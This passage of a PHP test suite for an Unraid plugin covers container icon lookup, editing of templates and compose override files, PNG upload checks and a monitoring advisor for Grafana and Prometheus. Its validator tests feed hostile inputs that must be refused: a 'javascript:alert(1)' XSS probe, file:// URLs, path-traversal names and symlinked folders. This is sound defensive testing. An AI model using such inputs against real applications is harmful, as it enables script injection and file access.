    $forged = $checks;
    $forged['emby'][1]['acked'] = true;
    same('dashboard: a must always counts', [1, 1], officeDashCareCounts(['checks' => $forged], $all));
    same("dashboard: desks that don't work here don't count", [0, 0], officeDashCareCounts(['checks' => $checks], ['caretaker' => 1]));
    same('dashboard: no state', [0, 0], officeDashCareCounts([], $all));
    foreach ([[['result' => 'running', 'mode' => 'backup'], 'dash.bk_running'], [['result' => 'running', 'mode' => 'check'], 'dash.bk_checking'],
              [['result' => 'running', 'mode' => 'dryrun'], 'dash.bk_dryrun'], [['result' => 'ok', 'mode' => 'check'], 'dash.bk_running'],
              [null, 'dash.bk_running']] as [$status, $want]) {
        same('dashboard: the engine runs, status ' . json_encode($status), $want, officeDashBackupRunning(['running' => true, 'status' => $status]));
    }
}

/** Ms. Dustdevil's pictures: how Unraid matches templates, the logo lookup, and editing templates and override files on copies */
function testIcons(): void
{
    // DockerUtil::ensureImageTag(): a template's <Repository> and a container's image compare like this
    same('icon: image tag, official image', 'library/php:apache', clImageTag('php:apache'));
    same('icon: image tag, latest added', 'ghcr.io/imagegenius/kopia:latest', clImageTag('ghcr.io/imagegenius/kopia'));
    same('icon: image tag, registry port', 'registry:5000/team/app:latest', clImageTag('registry:5000/team/app'));
    same('icon: image tag, same image', clImageTag('library/redis:latest'), clImageTag('redis'));

    foreach ([['ghcr.io/immich-app/postgres:14-vectorchord0.4.3@sha256:bcf6', ['ghcr.io/immich-app/postgres', 'immich-app/postgres']],
              ['docker.io/valkey/valkey:9@sha256:c123', ['valkey/valkey', 'valkey/valkey']],
              ['mariadb:11.4', ['mariadb', 'mariadb']],
              ['lscr.io/linuxserver/mariadb', ['lscr.io/linuxserver/mariadb', 'linuxserver/mariadb']],
              ['registry:5000/Team/App:1', ['registry:5000/team/app', 'team/app']],
              ['library/nginx:alpine', ['nginx', 'nginx']]] as [$image, $want]) {
        same("icon: lookup names of $image", $want, clIconRepo($image));
    }
    foreach (['immich-app/immich-server' => 'immich', 'immich-app/immich-machine-learning' => 'immich', 'immich-app/postgres' => 'postgres',
              'tensorchord/pgvecto-rs' => 'postgres', 'tensorchord/vchord-postgres' => 'postgres', 'valkey/valkey' => 'valkey', 'redis' => 'redis',
              'mariadb' => 'mariadb', 'linuxserver/mariadb' => 'mariadb', 'mysql' => 'mysql', 'mongo' => 'mongodb', 'nextcloud' => 'nextcloud',
              'nextcloud-ocr' => 'nextcloud', 'nextcloud/all-in-one' => 'nextcloud', 'jellyfin/jellyfin' => 'jellyfin', 'plexinc/pms-docker' => 'plex',
              'linuxserver/plex' => 'plex', 'emby/embyserver' => 'emby', 'binhex/arch-emby' => 'emby', 'php' => 'php', 'httpd' => 'apache',
              'jc21/nginx-proxy-manager' => 'nginx-proxy-manager', 'homeassistant/home-assistant' => 'home-assistant',
              'vaultwarden/server' => 'vaultwarden', 'kopia/kopia' => null, 'uping/embystat' => null, 'linuxserver/jellyseerr' => null] as $loose => $want) {
        same("icon: table for $loose", $want, clIconTableSlug($loose));
    }
    foreach (CL_ICON_TABLE as $re => $slug) {
        check("icon: table entry $slug is a name of the collection", preg_match('/^[a-z0-9]+(-[a-z0-9]+)*$/', $slug) === 1 && @preg_match($re, '') !== false);
    }
    same('icon: guesses for immich ML', ['immich-machine-learning', 'immich'], clIconGuesses('immich-app/immich-machine-learning'));
    same('icon: guesses for sonarr', ['sonarr'], clIconGuesses('linuxserver/sonarr'));
    same('icon: guesses leave generic words out', ['arch-emby', 'emby'], clIconGuesses('binhex/arch-emby'));
    same('icon: guesses strip -server and docker-', ['docker-foo-server', 'foo'], clIconGuesses('x/docker-foo_server'));

    // Community Applications' feed: an Icon belongs to the Repository before it, unless another entry began
    $feed = implode("\n", ['s:4:"Name";', 's:10:"Repository";s:13:"valkey/valkey"', 's:4:"Icon";s:18:"https://x/vk-1.png"',
        's:4:"Name";', 's:4:"Name";', 's:10:"Repository";s:21:"lscr.io/linuxserver/a"', 's:4:"Name";',
        's:4:"Name";', 's:4:"Icon";s:19:"https://x/plug.png"',
        's:4:"Name";', 's:10:"Repository";s:20:"valkey/valkey:8-trix"', 's:4:"Icon";s:18:"https://x/vk-2.png"',
        's:4:"Name";', 's:10:"Repository";s:5:"redis"', 's:4:"Icon";s:17:"https://x/r.svg"',
        '"Name": "b"', '"Repository": "ghcr.io/versity/versitygw"', '"Icon": "https:\/\/x\/vgw.png"', '"Name": "App Data"']);
    $ca = clCaParse($feed);
    same('ca: pictures by image', ['https://x/vk-1.png' => 1, 'https://x/vk-2.png' => 1], $ca['exact']['valkey/valkey'] ?? null);
    check('ca: a plugin\'s picture never goes to the app before it', !isset($ca['exact']['lscr.io/linuxserver/a']));
    check('ca: svg left out', !isset($ca['exact']['redis']));
    same('ca: JSON feed, loose name', ['https://x/vgw.png' => 1], $ca['loose']['versity/versitygw'] ?? null);

    check('icon url ok', clIconUrlOk('https://example.com/a/b-1.png?x=1&y=2'));
    foreach (['file:///boot/x.png', 'ftp://x/y.png', 'https://x/a b.png', 'https://x/"a.png', "https://x/a\n.png", 'javascript:alert(1)', 'https://x/a<b>.png'] as $bad) {
        check('icon url refused: ' . json_encode($bad), !clIconUrlOk($bad));
    }
    same('icon: override name', 'compose.override.yaml', clOverrideName('/x/compose.yaml'));
    same('icon: override name, old style', 'docker-compose.override.yml', clOverrideName('/x/docker-compose.yml'));
    same('icon: home of a template', CL_TEMPLATES, clIconHome(CL_TEMPLATES . '/my-a.xml', '/r'));
    same('icon: home of an override file', '/r/p', clIconHome('/r/p/compose.override.yaml', '/r'));
    same('icon: no home elsewhere', '', clIconHome('/r/p/q/compose.override.yaml', '/r') . clIconHome('/tmp/my-a.xml', '/r') . clIconHome('/r/p/compose.yaml', '/r'));

    // a template: only its <Icon> changes
    $tpl = "<?xml version=\"1.0\"?>\n<Container version=\"2\">\n  <Name>web</Name>\n  <Repository>php:apache</Repository>\n  <Registry/>\n  <Icon/>\n  <Config Name=\"x\" Type=\"Path\">/mnt/user/appdata/web</Config>\n</Container>\n";
    same('template: empty <Icon/> set', str_replace('<Icon/>', '<Icon>https://x/a.png?b=1&amp;c=2</Icon>', $tpl), clXmlSetIcon($tpl, 'https://x/a.png?b=1&c=2', 't'));
    $old = str_replace('<Icon/>', '<Icon>/boot/config/plugins/dockerMan/images/Apache.png</Icon>', $tpl);
    same('template: old <Icon> replaced', str_replace('<Icon/>', '<Icon>file:///boot/x.png</Icon>', $tpl), clXmlSetIcon($old, 'file:///boot/x.png', 't'));
    $none = str_replace("  <Icon/>\n", '', $tpl);
    same('template: <Icon> added after <Repository>', str_replace("</Repository>\n", "</Repository>\n  <Icon>https://x/a.png</Icon>\n", $none), clXmlSetIcon($none, 'https://x/a.png', 't'));
    foreach (['two icons' => str_replace('<Icon/>', "<Icon/>\n  <Icon>y</Icon>", $tpl), 'CDATA' => str_replace('<Icon/>', '<Icon><![CDATA[x]]></Icon>', $tpl),
              'no template' => "<foo/>\n"] as $what => $bad) {
        try {
            clXmlSetIcon($bad, 'https://x/a.png', 't');
            check("template refused: $what", false);
        } catch (Problem $p) {
            same("template refused: $what", 'cleanup_icon_shape', $p->key);
        }
    }

    // an override file, the shapes Compose Manager writes
    $set = ['database' => 'https://x/pg.png'];
    $cm = clOverrideTemplate();
    same('override: Compose Manager\'s new file', str_replace("services: {}\n", "services:\n  database:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/pg.png'\n", $cm),
        clOverrideSetIcons($cm, $set, 'o'));
    $immich = "services:\n  immich-server:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: ''\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell: ''\n"
            . "  database:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: ''   # empty\n      net.unraid.docker.webui: ''\n";
    $want = str_replace("      net.unraid.docker.icon: ''   # empty\n", "      net.unraid.docker.icon: 'https://x/pg.png'\n", $immich);
    $want = str_replace("      net.unraid.docker.icon: ''\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell", "      net.unraid.docker.icon: 'https://x/im''s.png'\n      net.unraid.docker.webui: ''\n      net.unraid.docker.shell", $want);
    same('override: only the icon lines change', $want, clOverrideSetIcons($immich, $set + ['immich-server' => "https://x/im's.png"], 'o'));
    $more = "version: '3'\nservices:\n  app:\n    environment:\n      - A=1\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      com.example.x: \"y\"\n  cron:\n    environment:\n      B: 2\n\n# end\nnetworks:\n  default: {}\n";
    same('override: added to labels, a new labels block, a new service', "version: '3'\nservices:\n  app:\n    environment:\n      - A=1\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/a.png'\n      com.example.x: \"y\"\n"
        . "  cron:\n    environment:\n      B: 2\n    labels:\n      net.unraid.docker.icon: 'https://x/c.png'\n  redis:\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/r.png'\n\n# end\nnetworks:\n  default: {}\n",
        clOverrideSetIcons($more, ['app' => 'https://x/a.png', 'cron' => 'https://x/c.png', 'redis' => 'https://x/r.png'], 'o'));
    same('override: labels: {} and CRLF', "services:\r\n  app:\r\n    labels:\r\n      net.unraid.docker.icon: 'https://x/a.png'\r\n",
        clOverrideSetIcons("services:\r\n  app:\r\n    labels: {}\r\n", ['app' => 'https://x/a.png'], 'o'));
    same('override: empty file', "services:\n  '1':\n    labels:\n      net.unraid.docker.managed: 'composeman'\n      net.unraid.docker.icon: 'https://x/a.png'\n",
        clOverrideSetIcons('', ['1' => 'https://x/a.png'], 'o'));
    foreach (['tab' => "services:\n\tapp:\n", 'four spaces' => "services:\n    app:\n      labels:\n", 'labels as a list' => "services:\n  app:\n    labels:\n      - \"a=b\"\n",
              'merge key' => "services:\n  app:\n    <<: *base\n", 'anchor' => "services:\n  app:\n    labels:\n      net.unraid.docker.icon: &i x\n",
              'flow services' => "services: {app: {}}\n", 'deeper label' => "services:\n  app:\n    labels:\n      a:\n        b: c\n",
              'block scalar' => "services:\n  app:\n    labels:\n      a: |\n        x\n", 'twice' => "services:\n  app: \nservices:\n"] as $what => $bad) {
        try {
            clOverrideSetIcons($bad, ['app' => 'https://x/a.png'], 'o');
            check("override refused: $what", false);
        } catch (Problem $p) {
            same("override refused: $what", 'cleanup_icon_shape', $p->key);
        }
    }

    // on copies: swap a template into a storeroom and back; a new override file and back; Unraid's cache
    $tmp = sys_get_temp_dir() . '/office-tests-icons-' . getmypid();
    @mkdir("$tmp/templates", 0700, true);
    @mkdir("$tmp/project", 0700, true);
    @mkdir("$tmp/ram", 0700, true);
    @mkdir("$tmp/disk", 0700, true);
    file_put_contents("$tmp/templates/my-web.xml", $old);
    $new = clXmlSetIcon($old, 'https://x/a.png', 't');
    clIconReplace("$tmp/templates/my-web.xml", $new, "$tmp/trash/run/icons/abc/my-web.xml");
    same('swap: the new template in place', $new, file_get_contents("$tmp/templates/my-web.xml"));
    same('swap: the old one in the storeroom', $old, file_get_contents("$tmp/trash/run/icons/abc/my-web.xml"));
    same('swap: no temp file left', [], glob("$tmp/templates/.*.tmp") ?: []);
    $m = ['from' => "$tmp/templates/my-web.xml", 'written' => md5($new), 'was' => 'there'];
    file_put_contents("$tmp/templates/my-web.xml", $new . ' ');
    try {
        clIconPutBack("$tmp/trash/run/icons/abc/my-web.xml", $m);
        check('put back refused once the template changed', false);
    } catch (Problem $p) {
        same('put back refused once the template changed', 'cleanup_icon_changed', $p->key);
    }
    file_put_contents("$tmp/templates/my-web.xml", $new);
    clIconPutBack("$tmp/trash/run/icons/abc/my-web.xml", $m);
    same('put back: the old template again', $old, file_get_contents("$tmp/templates/my-web.xml"));
    check('put back: out of the storeroom', !file_exists("$tmp/trash/run/icons/abc/my-web.xml"));

    $override = "$tmp/project/compose.override.yaml";
    $text = clOverrideSetIcons(clOverrideTemplate(), $set, 'o');
    clIconReplace($override, $text, "$tmp/trash/run/icons/def/compose.override.yaml", clOverrideTemplate());
    same('new override: written', $text, file_get_contents($override));
    same('new override: Compose Manager\'s empty one in the storeroom', clOverrideTemplate(), file_get_contents("$tmp/trash/run/icons/def/compose.override.yaml"));
    file_put_contents("$tmp/png", "\x89PNG\r\n\x1a\n" . str_repeat('x', 100));
    file_put_contents("$tmp/docker.json", json_encode(['other' => ['icon' => '/x.png', 'url' => 'u'], 'web' => ['icon' => CL_DM_FALLBACK_WEB, 'updated' => 'false']]));
    $cache = clIconSeed('web', "$tmp/png", ["$tmp/ram", "$tmp/disk"], "$tmp/docker.json", '/state/x');
    same('seed: both copies', ["$tmp/ram/web-icon.png", "$tmp/disk/web-icon.png"], array_keys($cache));
    $dj = json_decode((string) file_get_contents("$tmp/docker.json"), true);
    same('seed: docker.json points at it, the rest stays', ['other' => ['icon' => '/x.png', 'url' => 'u'], 'web' => ['icon' => '/state/x/web-icon.png', 'updated' => 'false']], $dj);
    same('seed: a strange name is refused', [], clIconSeed('../x', "$tmp/png", ["$tmp/ram"], "$tmp/docker.json"));
    file_put_contents("$tmp/project/icon_url", 'https://x/a.png');
    clIconPutBack("$tmp/trash/run/icons/def/compose.override.yaml", ['from' => $override, 'written' => md5($text), 'was' => 'missing', 'cache' => $cache,
        'icon_url' => ['path' => "$tmp/project/icon_url", 'md5' => md5('https://x/a.png'), 'was' => 'missing']], ["$tmp/ram", "$tmp/disk"]);
    check('put back: the new override file is gone again', !file_exists($override) && !file_exists("$tmp/trash/run/icons/def/compose.override.yaml"));
    check('put back: icon_url and the cache copies gone', !file_exists("$tmp/project/icon_url") && !file_exists("$tmp/ram/web-icon.png") && !file_exists("$tmp/disk/web-icon.png"));

    // what curl answered: a picture only with 200 and a PNG
    file_put_contents("$tmp/0.png", "\x89PNG\r\n\x1a\nxx");
    file_put_contents("$tmp/1.png", '<html>');
    $r = clIconFetchResults("1\t200\t6\ttext/html\n0\t200\t10\timage/png\n2\t404\t9\ttext/plain\n", ['https://a/0.png', 'https://a/1.png', 'https://a/2.png', 'https://a/3.png'], $tmp);
    ksort($r);
    same('fetch: what loads', ['https://a/0.png' => true, 'https://a/1.png' => false, 'https://a/2.png' => false, 'https://a/3.png' => false], array_map(fn ($x) => $x['ok'], $r));
    same('fetch: why not', [null, 'not_png', 'http_404', 'unreachable'], array_values(array_map(fn ($x) => $x['why'], [$r['https://a/0.png'], $r['https://a/1.png'], $r['https://a/2.png'], $r['https://a/3.png']])));
    $cmd = clIconFetchCommand(['https://a/0.png'], '/d');
    check('fetch: no shell globbing, http(s) only, no User-Agent', in_array('-g', $cmd, true) && in_array('=http,https', $cmd, true) && $cmd[array_search('-A', $cmd, true) + 1] === '');
    same('loop risk: its fields', ['version', 'affected', 'fallback_missing', 'containers', 'risk', 'standin'], array_keys(cleanupIconLoopRisk([])));

    // pictures in dockerMan/images named like the app — never by the first word of the container's name alone
    $files = ['Apache.png', 'AppleTimeMachine.png', 'emby.png', 'Nextcloud.png', 'cloud.png', 'redis.png', 'app.png'];
    foreach ([['mbentley/timemachine', 'TimeMachine_Benj', ['AppleTimeMachine.png']], ['emby/embyserver', 'EmbyServer', ['emby.png']],
              ['nextcloud-ocr', 'nextcloud-app', ['Nextcloud.png']], ['mariadb', 'nextcloud-db', []], ['redis', 'nextcloud-redis', ['redis.png']],
              ['php', 'CKW-Webseite', []], ['x/y', 'apache', ['Apache.png']]] as [$loose, $name, $want]) {
        same("icon folder: $name ($loose)", $want, clIconFolderMatches($loose, $name, $files));
    }
    check('icon: Time Machine by name or image', preg_match(CL_ICON_TIMEMACHINE, 'TimeMachine_Benj x/y') && preg_match(CL_ICON_TIMEMACHINE, 'b willtho89/samba-time_machine')
        && !preg_match(CL_ICON_TIMEMACHINE, 'machine timer'));
    same('icon: a safe file name', ['TimeMachine_Benj', 'a_b_c', 'container'], [clIconFileName('TimeMachine_Benj'), clIconFileName('../a b/c'), clIconFileName('..')]);

    // the stack's picture: its main app, never a database, machine learning only without a better one
    $immich = [['id' => 'icon:ml', 'name' => 'immich_machine_learning', 'service' => 'immich-machine-learning', 'image' => 'ghcr.io/immich-app/immich-machine-learning:v3', 'project' => 'immich'],
               ['id' => 'icon:pg', 'name' => 'immich_postgres', 'service' => 'database', 'image' => 'ghcr.io/immich-app/postgres:14', 'project' => 'immich'],
               ['id' => 'icon:sv', 'name' => 'immich_server', 'service' => 'immich-server', 'image' => 'ghcr.io/immich-app/immich-server:v3', 'project' => 'immich'],
               ['id' => 'icon:rd', 'name' => 'immich_redis', 'service' => 'redis', 'image' => 'valkey/valkey:9', 'project' => 'immich']];
    same('stack: ranks', [4, null, 1, null], array_map('clIconMainRank', $immich));
    $picked = fn (array $list) => clIconStackPick(array_map(fn ($e) => $e + ['pick' => 'https://x/' . $e['name'] . '.png'], $list), $immich)['name'] ?? null;
    same('stack: the server, not machine learning', 'immich_server', $picked($immich));
    same('stack: machine learning alone waits for the server', null, $picked([$immich[0]]));
    same('stack: a database alone never', null, $picked([$immich[1]]));
    same('stack: named like the project first', 'nextcloud', clIconStackPick([['id' => 'a', 'name' => 'nc-web', 'service' => 'web', 'image' => 'nginx', 'project' => 'nextcloud', 'pick' => 'https://x/w.png'],
        ['id' => 'b', 'name' => 'nextcloud', 'service' => 'nextcloud', 'image' => 'nextcloud', 'project' => 'nextcloud', 'pick' => 'https://x/n.png']], [])['name'] ?? null);
    same('stack: no picture from a file on the server', null, clIconStackPick([$immich[2] + ['pick' => 'file:///boot/x.png']], $immich));

    // an uploaded picture: a PNG, small, at most 512 x 512
    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==');
    check('upload: a 1x1 PNG', clIconUploadOk($png));
    check('upload: 1000 pixels wide refused', !clIconUploadOk(substr_replace($png, pack('N', 1000), 16, 4)));
    check('upload: a JPEG refused', !clIconUploadOk("\xFF\xD8\xFF\xE0" . substr($png, 4)));
    check('upload: too big refused', !clIconUploadOk($png . str_repeat("\0", CL_UPLOAD_MAX)));
    check('upload: cut off refused', !clIconUploadOk(substr($png, 0, -12)));
    $r = ['items' => [['id' => 'icon:web', 'upload' => base64_encode($png)], ['id' => 'icon:db', 'url' => ' https://x/a.png ']]];
    same('upload: items', ['icon:web' => ['url' => null, 'png' => $png], 'icon:db' => ['url' => 'https://x/a.png', 'png' => null]], clIconItems($r));
    try {
        clIconItems(['items' => [['id' => 'icon:web', 'upload' => 'not base64!']]]);
        check('upload: bad base64 refused', false);
    } catch (Problem $p) {
        same('upload: bad base64 refused', 'cleanup_icon_upload_bad', $p->key);
    }

    // kept in the office's icons folder: the same picture again reused, another one beside it; put back takes mine away while unchanged
    $icons = "$tmp/icons";
    $a = clIconStore('web', $png, $icons);
    same('store: new', ['path' => "$icons/web.png", 'created' => true, 'md5' => md5($png)], $a);
    same('store: the same again', ['path' => "$icons/web.png", 'created' => false, 'md5' => md5($png)], clIconStore('web', $png, $icons));
    $other = substr_replace($png, pack('N', 2), 16, 4);
    same('store: another beside it', "$icons/web-2.png", clIconStore('web', $other, $icons)['path']);
    same('store: found for the container again', ["$icons/web-2.png", "$icons/web.png"], clIconUploads('web', $icons));
    clIconUnstore("$icons/web-2.png", md5($png), $icons);
    check('unstore: a changed file stays', is_file("$icons/web-2.png"));
    clIconUnstore("$tmp/png", (string) md5_file("$tmp/png"), $icons);
    check('unstore: nothing outside the folder', is_file("$tmp/png"));
    file_put_contents("$tmp/templates/my-web.xml", $old);
    $new = clXmlSetIcon($old, "file://$icons/web.png", 't');
    clIconReplace("$tmp/templates/my-web.xml", $new, "$tmp/trash/run/icons/up/my-web.xml");
    clIconPutBack("$tmp/trash/run/icons/up/my-web.xml", ['from' => "$tmp/templates/my-web.xml", 'written' => md5($new), 'was' => 'there',
        'uploads' => [$a['path'] => $a['md5']]], ["$tmp/ram"], $icons);
    check('put back: the uploaded picture is gone, the other stays', !is_file("$icons/web.png") && is_file("$icons/web-2.png"));

    // previews: PNG and JPEG as data: addresses, within the budget, only files on the server
    file_put_contents("$tmp/p.png", $png);
    file_put_contents("$tmp/a.jpg", "\xFF\xD8\xFF\xE0xx");
    file_put_contents("$tmp/a.txt", 'hello');
    $p64 = 'data:image/png;base64,' . base64_encode($png);
    same('preview: PNG, JPEG, not text', [$p64, 'data:image/jpeg;base64,' . base64_encode("\xFF\xD8\xFF\xE0xx"), null],
        [clIconPreview("$tmp/p.png"), clIconPreview("$tmp/a.jpg"), clIconPreview("$tmp/a.txt")]);
    $room = [['category' => 'template', 'candidates' => [['url' => "file://$tmp/p.png"], ['url' => "file://$tmp/a.jpg"], ['url' => 'https://x/a.png']]],
             ['category' => 'ok', 'candidates' => [['url' => "file://$tmp/a.txt"]]]];
    same('previews: only files, within the budget', ["file://$tmp/p.png" => $p64, "file://$tmp/a.jpg" => null], clIconPreviews($room, strlen($p64) + 5));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** The Consultant: which container is which external, and whether the node exporter reads the office's folder */
function testAdvisor(): void
{
    foreach (['quay.io/prometheus/node-exporter:latest-distroless' => 'node-exporter', 'prom/prometheus' => 'prometheus',
              'grafana/grafana:12.1.0' => 'grafana', 'grafana/loki:master' => 'loki', 'registry:5000/Team/App:1' => 'app',
              'bitnami/node-exporter@sha256:ab12' => 'node-exporter', 'redis' => 'redis'] as $image => $want) {
        same("advisor: image name of $image", $want, advisorImageName($image));
    }
    $c = fn (string $name, string $image, bool $running = true) => ['name' => $name, 'image' => $image, 'running' => $running];
    $all = ['loki' => $c('loki', 'grafana/loki:master'), 'renderer' => $c('renderer', 'grafana/grafana-image-renderer'),
            'old' => $c('Grafana-old', 'grafana/grafana-oss', false), 'Grafana' => $c('Grafana', 'grafana/grafana'),
            'prometheus' => $c('prometheus', 'prom/prometheus'), 'exp' => $c('Node-Exporter', 'quay.io/prometheus/node-exporter:latest-distroless'),
            'qbit' => $c('qbit-exporter', 'esanchezm/prometheus-qbittorrent-exporter'), 'kopia' => $c('KopiaUI', 'ghcr.io/imagegenius/kopia')];
    $find = fn (string $id, array $list) => advisorFindContainer(ADVISOR_EXTERNALS[$id], $list)['name'] ?? null;
    same('advisor: Grafana, the running one, not Loki or the renderer', 'Grafana', $find('grafana', $all));
    same('advisor: a stopped Grafana is found too', 'Grafana-old', $find('grafana', array_diff_key($all, ['Grafana' => 1])));
    same('advisor: Loki is grafana/loki', 'loki', $find('loki', $all));
    same('advisor: Prometheus, not an exporter for it', 'prometheus', $find('prometheus', $all));
    same('advisor: no Prometheus without one', null, $find('prometheus', ['qbit' => $all['qbit']]));
    same('advisor: the node exporter by its image', 'Node-Exporter', $find('nodeexporter', $all));
    same('advisor: a node exporter by its name', 'node_exporter', $find('nodeexporter', [$c('node_exporter', 'some/thing')]));
    same('advisor: Kopia as before (image or name contains it)', 'KopiaUI', $find('kopia', $all));

    // the template's Post Arguments: the host's / is /host in there
    $template = ['--path.rootfs=/host', '--path.procfs=/host/proc', '--path.sysfs=/host/sys', '--path.udev.data=/host/run/udev/data'];
    $root = [['/', '/host']];
    same('advisor: textfile — the template alone reads nothing', [], advisorTextfileDirs($template, $root));
    same('advisor: textfile — through /host', [ADVISOR_METRICS_DIR],
        advisorTextfileDirs([...$template, '--collector.textfile.directory=/host' . ADVISOR_METRICS_DIR], $root));
    same('advisor: textfile — a path of its own, the deepest mount wins', [ADVISOR_METRICS_DIR],
        advisorTextfileDirs(['--collector.textfile.directory', '/textfile/'], [['/', '/host'], [ADVISOR_METRICS_DIR . '/', '/textfile']]));
    same('advisor: textfile — inside the container only: not on the host', [],
        advisorTextfileDirs(['--collector.textfile.directory=/var/lib/node_exporter'], [['/mnt/user/appdata/x', '/config']]));
    same('advisor: textfile — /hostile is not under /host', [], advisorTextfileDirs(['--collector.textfile.directory=/hostile/x'], $root));
    same('advisor: textfile — on the host (the plugin), given twice', [ADVISOR_METRICS_DIR, '/var/lib/x'],
        advisorTextfileDirs(['--collector.textfile.directory="' . ADVISOR_METRICS_DIR . '/"', '--collector.textfile.directory=/var/lib/x'], null));

    // «reads the office's folder» only while that folder is really there (a fresh Unraid had no /mnt/addons)
    $tmp = hardeningTmp('advisor-metrics');
    @mkdir("$tmp/metrics", 0755);
    @symlink("$tmp/metrics", "$tmp/linked");
    same('advisor: the office\'s folder - there, missing, a link', [true, false, false],
        [advisorMetricsThere("$tmp/metrics"), advisorMetricsThere("$tmp/missing"), advisorMetricsThere("$tmp/linked")]);
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('advisor: textfile chip - node is missing here - skipped', true);
    } else {
        $js = <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
globalThis.Office = { scope: () => T, t: T, el: () => ({}), fmt: {}, desk: () => {}, has: () => false };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const a = OFFICE_DESK_TESTS.advisor;
const out = [];
for (const there of [true, false, undefined]) {
  a.setState({ metrics_dir: '/mnt/addons/UnraidSecretaryOffice/metrics', metrics_there: there });
  out.push([true, false, null].map((textfile) => { const c = a.textfileChip({ textfile }); return c ? c.cls + ' ' + c.text : null; }));
}
a.setState({ metrics_dir: '/x', metrics_there: false });
out.push(a.textfileChip({ textfile: true }).tip);
console.log(JSON.stringify(out));
JS;
        file_put_contents("$tmp/t.js", $js);
        $cmd = escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/advisor/desk.js') . ' 2>&1';
        $r = json_decode((string) shell_exec($cmd), true);
        same('advisor: textfile chip - reads the folder only while it is there; not set stays not set; an older state as before',
            [['ok textfile_yes', 'warn textfile_no', null], ['warn textfile_nodir', 'warn textfile_no', null], ['ok textfile_yes', 'warn textfile_no', null],
             'textfile_nodir_tip {"dir":"/x"}'], $r, is_array($r) ? '' : (string) shell_exec($cmd));
    }
    hardeningRm($tmp);
}

/** The Consultant installs: his templates, what he refuses, what he writes beforehand (only where nothing is), the facts he reads */
function testAdvisorInstall(): void
{
    // the provisioned dashboard keeps Grafana's value mappings as objects ("0", "1" … keys) and has its data source
    $src = __DIR__ . '/../monitoring/grafana-dashboard.json';
    $out = advisorDashboardJson($src);
    $objects = function (string $json): int {
        preg_match_all('/"options":\s*\{/', $json, $m);
        return count($m[0]);
    };
    same('advisor dashboard: mappings stay objects, data source filled in', [$objects((string) file_get_contents($src)), false],
        [$objects((string) $out), str_contains((string) $out, '${DS_PROMETHEUS}')]);

    // the provisioned dashboard kept current: only the office's own file (its uid), plain, never created; owner and mode kept
    $keep = hardeningTmp('advisor-dashboard');
    $dir = "$keep/provisioning/dashboards/uso";
    mkdir($dir, 0755, true);
    $file = "$dir/unraid-secretary-office.json";
    $old = str_replace('"title": "Unraid Secretary Office (USO)"', '"title": "The office"', (string) $out);
    check('advisor dashboard keep: the test\'s old version differs', $old !== $out);
    same('advisor dashboard keep: none there — none made', ['absent', false], [advisorDashboardKeep($file, $out), file_exists($file)]);
    file_put_contents($file, $old);
    chmod($file, 0640);
    $owner = posix_getuid() === 0 ? [472, 100] : [posix_getuid(), posix_getgid()];       // as root: Grafana's user, like a real one
    chown($file, $owner[0]);
    chgrp($file, $owner[1]);
    $ino = fileinode($file);
    same('advisor dashboard keep: an older version of the office\'s — replaced, owner and mode kept, a new file', ['updated', $out, 0640, $owner, true],
        [advisorDashboardKeep($file, $out), file_get_contents($file), fileperms($file) & 0777, [fileowner($file), filegroup($file)],
         (clearstatcache() ?? true) && fileinode($file) !== $ino]);
    same('advisor dashboard keep: the same — left alone', 'same', advisorDashboardKeep($file, $out));
    same('advisor dashboard keep: nothing to give', 'none', advisorDashboardKeep($file, null));
    $theirs = (string) json_encode(['uid' => 'my-own-copy', 'title' => 'Mine', 'panels' => []]);
    file_put_contents($file, $theirs);
    same('advisor dashboard keep: another uid (the user\'s own) — never touched', ['foreign', $theirs], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
    file_put_contents($file, 'not json');
    same('advisor dashboard keep: no JSON — never touched', ['foreign', 'not json'], [advisorDashboardKeep($file, $out), file_get_contents($file)]);
    unlink($file);
    file_put_contents("$keep/elsewhere.json", $old);
    symlink("$keep/elsewhere.json", $file);
    same('advisor dashboard keep: a link — never followed, never replaced', ['foreign', $old, true],
        [advisorDashboardKeep($file, $out), file_get_contents("$keep/elsewhere.json"), is_link($file)]);
    unlink($file);
    rename($dir, "$keep/real-uso");
    file_put_contents("$keep/real-uso/unraid-secretary-office.json", $old);
    symlink("$keep/real-uso", $dir);
    same('advisor dashboard keep: its folder a link — never written through', ['foreign', $old],
        [advisorDashboardKeep($file, $out), file_get_contents("$keep/real-uso/unraid-secretary-office.json")]);
    same('advisor dashboard keep: no tmp files left', [], array_values(array_filter(scandir("$keep/real-uso"), fn ($f) => str_ends_with($f, '.tmp'))));
    // at his scan or hourly: only while Grafana runs, in the provisioning folder its mappings give
    unlink($dir);
    rename("$keep/real-uso", $dir);
    $g = ['running' => false, 'host' => "$keep/provisioning"];
    advisorDashboardCurrent($g);
    same('advisor dashboard current: Grafana stopped — not looked at', $old, file_get_contents($file));
    advisorDashboardCurrent(['running' => true] + $g);
    same('advisor dashboard current: Grafana running — the office\'s dashboard of this version', advisorDashboardJson(ADVISOR_DASHBOARD_FILE), file_get_contents($file));
    exec('rm -rf ' . escapeshellarg($keep));
    // Unraid's exclusive shares: only /mnt/user/<share> → /mnt/<pool>/<share> is followed; other paths stay
    same('advisor: a path outside /mnt/user stays', '/tmp/x/y', advisorUnraidPath('/tmp/x/y'));
